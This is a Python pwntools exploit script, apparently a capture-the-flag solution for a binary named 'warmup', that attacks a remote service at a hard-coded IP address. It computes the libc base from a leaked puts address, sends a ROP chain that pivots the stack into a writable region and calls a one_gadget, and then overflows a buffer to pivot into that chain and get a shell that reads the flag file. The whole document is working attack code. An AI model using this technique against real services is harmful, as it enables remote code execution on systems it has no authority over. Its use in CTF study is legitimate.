#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./warmup", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6")

#p = elf.process()
#p = elf.debug(gdbscript="b *0x401280")
p = remote("172.210.129.230", 1338)

leak = int(p.readline().decode(), 16)

libc.address = leak - libc.sym["puts"]

log.success(f"libc: 0x{libc.address:X}")

p.readuntil(b"name>> ")

ONE_GADGET = libc.address + 0x583dc # rax=0 rbx=0 rsp&0xf=0
MOV_RSI_RDX = libc.address + 0x000000000005ad5a
POP_RDX_XOR_EAX_EAX_POP_RBX_POP_R12_POP_R13 = libc.address + 0x00000000000b502c
POP_RSI_POP_R15 = libc.address + 0x000000000010f759
POP_RSP = 0x000000000040118e
FAKE_STACK = 0x405000 - 0x208

payload = b""
payload += p64(POP_RSI_POP_R15)
payload += p64(FAKE_STACK)
payload += p64(0)
payload += p64(POP_RDX_XOR_EAX_EAX_POP_RBX_POP_R12_POP_R13)
payload += p64(ONE_GADGET)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(MOV_RSI_RDX)
payload += p64(POP_RSP)
payload += p64(FAKE_STACK)
p.sendline(payload)

p.readuntil(b"alright>> ")

payload = b"B" * 0x48
payload += p64(POP_RSP)
payload += p64(elf.symbols["name"])
p.sendline(payload)

p.clean()

p.sendline(b"/bin/cat flag.txt")

p.interactive()
